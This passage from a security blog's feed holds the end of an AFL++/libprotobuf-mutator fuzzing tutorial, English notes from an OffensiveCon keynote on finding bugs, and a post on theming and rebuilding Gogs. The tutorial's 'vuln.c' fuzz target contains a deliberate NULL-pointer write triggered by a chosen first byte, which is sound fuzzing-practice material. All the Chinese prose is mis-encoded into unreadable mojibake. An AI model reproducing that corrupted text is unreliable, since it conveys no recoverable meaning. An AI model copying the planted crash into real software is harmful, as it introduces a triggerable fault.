ChangeBit-Custom-Custom-InsertByte-Custom-</span><br><span class="line">#324    REDUCE cov: 138 ft: 162 corp: 3/24b lim: 4096 exec/s: 0 rss: 38Mb L: 12/12 MS: 3 CustomCrossOver-EraseBytes-Custom-</span><br></pre></td></tr></table></figure><h3 id="Handling-input-from-AFL-in-our-custom-mutator"><a href="#Handling-input-from-AFL-in-our-custom-mutator" class="headerlink" title="Handling input from AFL++ in our custom mutator"></a>Handling input from AFL++ in our custom mutator</h3><p><a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input</a></p><p>ä¸»è¦å†…å®¹æ˜¯å°† libprotobuf-mutator å’Œ afl++ ç»“åˆèµ·æ¥ï¼Œä½¿ç”¨çš„ afl++ çš„ custom mutatorï¼Œå€¼å¾—ä¸€æçš„æ˜¯åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œéœ€è¦ä½¿ç”¨ <code>-fPIC</code> å‚æ•°ç¼–è¯‘ libprotobuf-mutatorã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator \</span><br><span class="line">-DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug \</span><br><span class="line">-DCMAKE_C_FLAGS=<span class="string">&quot;-fPIC&quot;</span> -DCMAKE_CXX_FLAGS=<span class="string">&quot;-fPIC&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„æ­¥éª¤åœ¨ <a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/blob/master/5_libprotobuf_aflpp_custom_mutator_input/README.md">readme.md</a> ä¸­å·²ç»ä»‹ç»å¾—æ¯”è¾ƒæ¸…æ¥šäº†ã€‚</p><ul><li><code>lpm_aflpp_custom_mutator_input.cc</code> æ˜¯ afl++ çš„ custom mutator shared library<ul><li>è§£æè¾“å…¥æ•°æ®ï¼ˆtestcase bufferï¼‰å¹¶å°†å…¶è½¬æˆ <code>TEST</code> protobuf message</li><li>ä½¿ç”¨ <code>libprotobuf-mutator</code> å˜å¼‚ <code>TEST</code> protobuf message</li><li>æ³¨å†Œä¸€ä¸ª <code>PostProcessor</code> å¤„ç†å˜å¼‚åçš„ <code>TEST</code> protobuf message ï¼ˆéå¿…è¦æ­¥éª¤ï¼‰</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">size_t</span> <span class="title">afl_custom_fuzz</span><span class="params">(MyMutator *mutator, <span class="comment">// return value from afl_custom_init</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> *buf, <span class="type">size_t</span> buf_size, <span class="comment">// input data to be mutated</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> **out_buf, <span class="comment">// output buffer</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> *add_buf, <span class="type">size_t</span> add_buf_size,  <span class="comment">// add_buf can be NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">size_t</span> max_size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// This function can be named either &quot;afl_custom_fuzz&quot; or &quot;afl_custom_mutator&quot;</span></span><br><span class="line">    <span class="comment">// A simple test shows that &quot;buf&quot; will be the content of the current test case</span></span><br><span class="line">    <span class="comment">// &quot;add_buf&quot; will be the next test case ( from AFL++&#x27;s input queue )</span></span><br><span class="line">    </span><br><span class="line">    TEST input;</span><br><span class="line">    <span class="comment">// parse input data to TEST</span></span><br><span class="line">    <span class="comment">// Notice that input data should be a serialized protobuf data</span></span><br><span class="line">    <span class="comment">// Check ./in/ii and test_protobuf_serializer for more detail</span></span><br><span class="line">    <span class="type">bool</span> parse_ok = input.<span class="built_in">ParseFromArray</span>(buf, buf_size);</span><br><span class="line">    <span class="keyword">if</span>(!parse_ok) &#123;</span><br><span class="line">        <span class="comment">// Invalid serialize protobuf data. Don&#x27;t mutate.</span></span><br><span class="line">        <span class="comment">// Return a dummy buffer. Also mutated_size = 0</span></span><br><span class="line">        <span class="type">static</span> <span class="type">uint8_t</span> *dummy = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">10</span>]; <span class="comment">// dummy buffer with no data</span></span><br><span class="line">        *out_buf = dummy;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// mutate the protobuf</span></span><br><span class="line">    mutator-&gt;<span class="built_in">Mutate</span>(&amp;input, max_size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Convert protobuf to raw data</span></span><br><span class="line">    <span class="type">const</span> TEST *p = &amp;input;</span><br><span class="line">    std::string s = <span class="built_in">ProtoToData</span>(*p);</span><br><span class="line">    <span class="comment">// Copy to a new buffer ( mutated_out )</span></span><br><span class="line">    <span class="type">size_t</span> mutated_size = s.<span class="built_in">size</span>() &lt;= max_size ? s.<span class="built_in">size</span>() : max_size; <span class="comment">// check if raw data&#x27;s size is larger than max_size</span></span><br><span class="line">    <span class="type">uint8_t</span> *mutated_out = <span class="keyword">new</span> <span class="type">uint8_t</span>[mutated_size+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(mutated_out, s.<span class="built_in">c_str</span>(), mutated_size); <span class="comment">// copy the mutated data</span></span><br><span class="line">    <span class="comment">// Assign the mutated data and return mutated_size</span></span><br><span class="line">    *out_buf = mutated_out;</span><br><span class="line">    <span class="keyword">return</span> mutated_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mutator-&gt;Mutate(&amp;input, max_size);</code> ä¸ºçœŸæ­£èµ·ä½œç”¨çš„æ ¸å¿ƒä»£ç </p><ul><li><code>lpm_aflpp_custom_mutator_input.h</code>  ç»§æ‰¿äº†protobuf_mutator::Mutatorï¼Œ å¯ä»¥ä½¿ç”¨ libprotobuf-mutator çš„ Mutate æ–¹æ³•</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libprotobuf-mutator/src/mutator.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMutator</span> : <span class="keyword">public</span> protobuf_mutator::Mutator &#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p><code>test_proto_serializer.cc</code></p><ul><li>ç”¨äºç”Ÿæˆä¸€æ¡åºåˆ—åŒ–çš„ <code>TEST</code> protobuf messageï¼Œå¯ä»¥ä½œä¸º fuzz çš„åˆå§‹åŒ– testcase ä½¿ç”¨</li></ul></li><li><p><code>vuln.c</code> æ¼æ´æµ‹è¯•ç¨‹åº</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">100</span>);</span><br><span class="line">    <span class="type">int</span> *ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>( str[<span class="number">0</span>] == <span class="string">&#x27;\x02&#x27;</span> || str[<span class="number">0</span>] == <span class="string">&#x27;\xe8&#x27;</span>) &#123;</span><br><span class="line">        *ptr = <span class="number">123</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´æµ‹è¯•ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œåªè¦ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ <code>0xe8</code> æˆ–è€… <code>0x02</code> å³å¯ï¼Œlibprotobuf-mutator çš„å˜å¼‚åœ¨è¿™ä¸ªä¾‹å­é‡Œæ•ˆç‡å¹¶ä¸é«˜ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ <code>PostProcessor</code> æ¥ä¼˜åŒ–å˜å¼‚ã€‚</p><ul><li>Makefile</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_aflpp_custom_mutator_input</span><br><span class="line">CXX=clang++-11</span><br><span class="line">AFLCC=<span class="variable">$(HOME)</span>/AFLplusplus/afl-gcc</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/libprotobuf-mutator/build/external.protobuf</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line"></span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/libprotobuf-mutator</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/build/src/libfuzzer/libprotobuf-mutator-libfuzzer.a <span class="variable">$(LPM_DIR)</span>/build/src/libprotobuf-mutator.a</span><br><span class="line"></span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(LPM_DIR)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span>.so</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>.so: <span class="variable">$(TARGET)</span>.cc <span class="variable">$(PB_SRC)</span></span><br><span class="line"><span class="variable">$(CXX)</span> -fPIC -c <span class="variable">$^</span> <span class="variable">$(INC)</span></span><br><span class="line"><span class="variable">$(CXX)</span> -shared -Wall -O3 -o <span class="variable">$@</span> *.o <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="section">vuln: vuln.c</span></span><br><span class="line"><span class="variable">$(AFLCC)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">test_proto_serializer: test_proto_serializer.cc <span class="variable">$(PB_SRC)</span></span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">rm *.so *.o vuln test_proto_serializer</span><br></pre></td></tr></table></figure><p>Makefile æœ‰ç‘•ç–µï¼Œè¿™ä¸ªç« èŠ‚çš„å†…å®¹å’Œ libfuzzer æ²¡æœ‰å…³ç³»ï¼Œä¸éœ€è¦é“¾æ¥ <code>libprotobuf-mutator-libfuzzer.a</code></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://developers.google.com/protocol-buffers/docs/cpptutorial">https://developers.google.com/protocol-buffers/docs/cpptutorial</a><br><a href="https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md">https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md</a><br><a href="https://github.com/google/libprotobuf-mutator/">https://github.com/google/libprotobuf-mutator/</a><br><a href="https://llvm.org/docs/LibFuzzer.html">https://llvm.org/docs/LibFuzzer.html</a><br><a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;What-are-protocol-buffers&quot;&gt;&lt;a href=&quot;#What-are-protocol-buffers&quot; class=&quot;headerlink&quot; title=&quot;What are protocol buffers?&quot;&gt;&lt;/a&gt;&lt;a href=&quot;h</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Keynote - How Do You Actually Find Bugs?</title>
    <link href="http://usmacd.com/2022/05/05/How_do_you_actually_find_bugs/"/>
    <id>http://usmacd.com/2022/05/05/How_do_you_actually_find_bugs/</id>
    <published>2022-05-05T08:43:43.088Z</published>
    <updated>2022-05-05T08:43:43.088Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon">https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon</a></p><ul><li>Temperament<ul><li>Curiosity</li><li>Detail-oriented</li><li>Ability to deal with failure and continual evidence that youâ€™re wrong</li></ul></li><li>Learn how to deal with failure<ul><li>Two projects (can be unrealeted, or different parts of the same)<ul><li>Learn to recognize whe you have hit a wall and have become unproductive</li><li>Switch to your secondary project</li></ul></li><li>Consider having a development project as your seconary project<ul><li>Do an achiveable, measurable task</li><li>Regain a sense of achievement</li></ul></li></ul></li><li>Moving on - Knowning when to quit<ul><li>You will return it in the future</li></ul></li><li>Motivation - Remaining Enager<ul><li>The more youâ€™re curious about how a technology works or how an algorithm achives its goal, the less monotonous code review is</li></ul></li><li>Motivation - bug patching<ul><li>bugs being patched is frustrating<ul><li>â€¦ but they are evidence that you were on the right track!</li></ul></li></ul></li><li>Confidence<ul><li>Research is a daunting filed to enter</li><li>Some security reseacher you respect had the same self-doubt coming in, and have recurrences from time to time</li><li>Growth mindset: â€œI canâ€™t do that â€¦ Yetâ€</li></ul></li><li>Bias and assumptions<ul><li>Common code reviewer biases<ul><li>Everyone has looked at the already (many eyes make all bugs shallow)</li><li>Even if I found something, it will be unexploitable (Server side)</li><li>The X attack surface is not interesting now (eg, media parsing in browsers)</li><li>There are no more bugs in this</li><li>The protocol doesnâ€™t allow you to do X</li></ul></li></ul></li><li>Auditing Process<ul><li>Understanding the code</li><li>Documenting your findings</li><li>Identifying bias</li><li>Tooling</li><li>Revisit the code base</li><li>Analyze failures</li></ul></li><li>Attampt to understand the code<ul><li>A lot of people try to short-circuit this process<ul><li>Reliance on tools</li><li>Fuzzers&#x2F;static analyzers are a guide, not the whole process</li></ul></li><li>Many of todayâ€™s vulnerabilities are complex, and require in-depth understanding of the codebase</li><li>The more you understand about how the program works, the better equipped you are to find bugs ( and exploit them)</li><li>The best way to understand how something works is to explain to someone else</li></ul></li><li>What Iâ€™m looking for<ul><li>software risk &#x3D; available attack surface * complexity</li><li>attack surface can be indirect<ul><li>even mitigations are attack surface</li></ul></li><li>often you initial perception of attack surface is naive<ul><li>Hidden&#x2F;non-obvious attack surfaces are the best</li></ul></li><li>Complexity is plentiful<ul><li>Feature driven (thanks w3c)</li><li>Legacy support</li><li>Often avoidable: the anomaly of cheap complexity</li></ul></li></ul></li><li>Borrwoing ideas<ul><li>Bugtracker &#x2F; Diffs<ul><li>Can show where a bug is</li><li>Can inspire new ideas: variants, same bugs in other codebase</li><li>Mean but viable: track commits by error-prone developers</li></ul></li><li>Comments in the codebase<ul><li>Descripbe things Iâ€™d never thought of</li></ul></li></ul></li><li>Document your findings<ul><li>Get into the habit of documenting<ul><li>ideas, bugs candidates, idiosyncrasies, data structure, algorithms</li></ul></li><li>Documenting failed ideas is as important as documenting successful ones<ul><li>avoids repeating thie idea sometime later</li></ul></li><li>Long term view: Iâ€™m going to revisit this later</li></ul></li><li>Revisit code bases and failed bugs<ul><li>code bases are not static<ul><li>coee rewritten</li><li>Features added&#x2F;changed</li></ul></li><li>Environment is not static</li></ul></li><li>Analyze your failures<ul><li>if someone succeeds where you didnâ€™t, have a look at what they found</li><li>Try to figure out: why did I miss it?</li><li>Is this a one-off or teachable trick&#x2F;blind spot</li><li>Can you improve on that?</li><li>Is there a pattern in those falures?</li><li>Failures is an oppotunity to learn</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;amp;ab_channel=OffensiveCon&quot;&gt;https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;amp;ab_chan</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>gogs çš®è‚¤å’Œæºç å‡çº§</title>
    <link href="http://usmacd.com/2022/04/13/gogs/"/>
    <id>http://usmacd.com/2022/04/13/gogs/</id>
    <published>2022-04-13T03:21:39.541Z</published>
    <updated>2022-04-13T03:21:39.541Z</updated>
    
    <content type="html"><![CDATA[<p>gogs ä½¿ç”¨äº†ä¹Ÿæœ‰ä¸€å¹´å¤šäº†ï¼Œå°å›¢é˜Ÿä½¿ç”¨åŸºæœ¬è¿˜è¡Œã€‚æœ‰å‡ ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ç•Œé¢ä»£ç  merge æœ‰é—®é¢˜ï¼Œç¬¬äºŒä¸æ”¯æŒä»£ç  reviewï¼Œ<br>å¦‚æœèƒ½è§£å†³ä¸Šé¢ä¸¤ä¸ªé—®é¢˜å°±å¥½ç”¨å¾ˆå¤šäº†ã€‚ä¸‹é¢ä¸¤æ®µæ˜¯å¹´å‰æŠ˜è…¾ gogs çš„è®°å½•ï¼Œæ²¡æœ‰å•¥æŠ€æœ¯å«é‡ï¼Œåªæ˜¯åšä¸ªå¤‡ä»½ã€‚</p><h2 id="åˆ‡æ¢çš®è‚¤"><a href="#åˆ‡æ¢çš®è‚¤" class="headerlink" title="åˆ‡æ¢çš®è‚¤"></a>åˆ‡æ¢çš®è‚¤</h2><p><a href="https://github.com/Kos-M/GogsThemes">https://github.com/Kos-M/GogsThemes</a> æä¾›äº†ä¸¤æ¬¾çš®è‚¤ï¼Œæ–‡ä¸­ç»™å‡ºçš„æ–¹æ³•è¦ä¿®æ”¹ gogs é…ç½®ï¼Œç›´æ¥ä½¿ç”¨ TamperMonkey å°±å¯ä»¥äº†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Gogs Theme</span></span><br><span class="line"><span class="comment">// @resource     IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match        http://website:8000/*</span></span><br><span class="line"><span class="comment">// @grant        GM_getResourceText</span></span><br><span class="line"><span class="comment">// @grant        GM_addStyle</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> my_css = <span class="title function_">GM_getResourceText</span>(<span class="string">&quot;IMPORTED_CSS&quot;</span>);</span><br><span class="line">    <span class="title function_">GM_addStyle</span>(my_css);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨åæ•ˆæœå›¾</p><p><img src="https://github.com/henices/pictures/raw/master/gogs0.png"></p><h2 id="æºç å‡çº§"><a href="#æºç å‡çº§" class="headerlink" title="æºç å‡çº§"></a>æºç å‡çº§</h2><p>gogs å·²ç»æœ‰ä¸€å¹´å¤šæ²¡æœ‰æä¾›äºŒè¿›åˆ¶çš„å®‰è£…åŒ…äº†ï¼Œçœ‹äº†æ”¹è¿›ä¸å°‘ï¼Œå°±å°è¯•äº†æºç å‡çº§ã€‚<br>å‚è€ƒ <a href="https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85">https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85</a></p><h3 id="å®‰è£…-golang"><a href="#å®‰è£…-golang" class="headerlink" title="å®‰è£… golang"></a>å®‰è£… golang</h3><p>å‚è€ƒ Google å®˜æ–¹æ–‡æ¡£ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤å°±å¯ä»¥äº†ã€‚ <a href="https://go.dev/doc/install">https://go.dev/doc/install</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/go/bin</span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…‹éš†ä»“åº“åˆ° &quot;gogs&quot; å­ç›®å½•</span></span><br><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/gogs/gogs.git gogs</span><br><span class="line"><span class="comment"># ä¿®æ”¹å·¥ä½œç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> gogs</span><br><span class="line"><span class="comment"># ç¼–è¯‘ä¸»ç¨‹åºï¼Œè¿™ä¸ªæ­¥éª¤ä¼šä¸‹è½½æ‰€æœ‰ä¾èµ–</span></span><br><span class="line">go build -o gogs</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘è¿‡ç¨‹ä¼šä¸‹è½½æ–‡ä»¶ï¼ˆéœ€è¦è‡ªå¤‡æ¢¯å­ï¼‰ï¼Œç¼–è¯‘å®Œæˆåå°†åœ¨ gogs å·¥ä½œç›®ä¸‹ç”Ÿæˆ gogs å¯æ‰§è¡Œæ–‡ä»¶</p><h3 id="æ‰“åŒ…"><a href="#æ‰“åŒ…" class="headerlink" title="æ‰“åŒ…"></a>æ‰“åŒ…</h3><p>gogs æºç çš„ Makefile æä¾›äº†æ‰“åŒ…å‘½ä»¤ï¼Œæ‰§è¡Œ <code>make pack</code> å³å¯ï¼Œå°†åœ¨ release ç›®ç”Ÿæˆ <code>gogs.20220112095054.zip</code></p><h3 id="è¿ç§»é…ç½®"><a href="#è¿ç§»é…ç½®" class="headerlink" title="è¿ç§»é…ç½®"></a>è¿ç§»é…ç½®</h3><p>å°† gogs.20220112095054.zip è§£å‹ï¼Œè¿™å°±ç±»ä¼¼ gogs çš„äºŒè¿›åˆ¶å‡çº§äº† <a href="https://gogs.io/docs/upgrade/upgrade_from_binary">https://gogs.io/docs/upgrade/upgrade_from_binary</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> gogs gogs_old</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/custom gogs</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/data gogs</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/log gogs</span><br></pre></td></tr></table></figure><p>gogs 0.13 çš„é…ç½®å·²ç»å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚æœä¸ä¿®æ”¹é…ç½®æ‰§è¡Œ <code>./gogs web</code>ä¼šå‡ºç°é”™è¯¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2022/01/12 09:40:06 [ INFO] Gogs 0.13.0+dev</span><br><span class="line">2022/01/12 09:40:06 [FATAL] [...github/internal/route/install.go:75 GlobalInit()] Failed to initialize ORM engine:</span><br><span class="line">open database: failed to connect to `host=127.0.0.1 user=root database=gogs`: dial error (dial tcp 127.0.0.1:3306: connect: connection refused)</span><br></pre></td></tr></table></figure><p>çœ‹é”™è¯¯åƒæ˜¯åœ¨è¿æ¥ mysql çš„ 3306 ç«¯å£ï¼Œå¯æ˜¯é…ç½®æ–‡ä»¶è®¾ç½®çš„æ˜¯ä½¿ç”¨ sqliteï¼Œéå¸¸å›°æƒ‘ã€‚ä¸Šç½‘æœç´¢åè¯å®æ˜¯ gogs 0.13 çš„é…ç½®æ–‡ä»¶çš„å­—æ®µä¿®æ”¹äº†ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/gogs1.png"></p><p>æœ€å…³é”®çš„ä¸¤ä¸ªå­—æ®µæ˜¯æ•°æ®åº“ç›¸å…³çš„ <code>DB_TYPE</code> æ”¹ä¸º <code>TYPE</code>ï¼Œ <code>PASSWD</code> æ”¹ä¸º <code>PASSWORD</code> ä¿®æ”¹å <code>custom/conf/app.ini</code> åï¼Œæ‰§è¡Œ <code>./gogs web</code> ä¸€åˆ‡æ­£å¸¸ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;gogs ä½¿ç”¨äº†ä¹Ÿæœ‰ä¸€å¹´å¤šäº†ï¼Œå°å›¢é˜Ÿä½¿ç”¨åŸºæœ¬è¿˜è¡Œã€‚æœ‰å‡ ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ç•Œé¢ä»£ç  merge æœ‰é—®é¢˜ï¼Œç¬¬äºŒä¸æ”¯æŒä»£ç  reviewï¼Œ&lt;br&gt;å¦‚æœèƒ½è§£å†³ä¸Šé¢ä¸¤ä¸ªé—®é¢˜å°±å¥½ç”¨å¾ˆå¤šäº†ã€‚ä¸‹é¢ä¸¤æ®µæ˜¯å¹´å‰æŠ˜è…¾ gogs çš„è®°å½•ï¼Œæ²¡æœ‰å•¥æŠ€æœ¯å«é‡ï¼Œåªæ˜¯åšä¸ªå¤‡ä»½ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åˆ‡æ¢çš®è‚¤&quot;</summary>
      
    
    
    
    
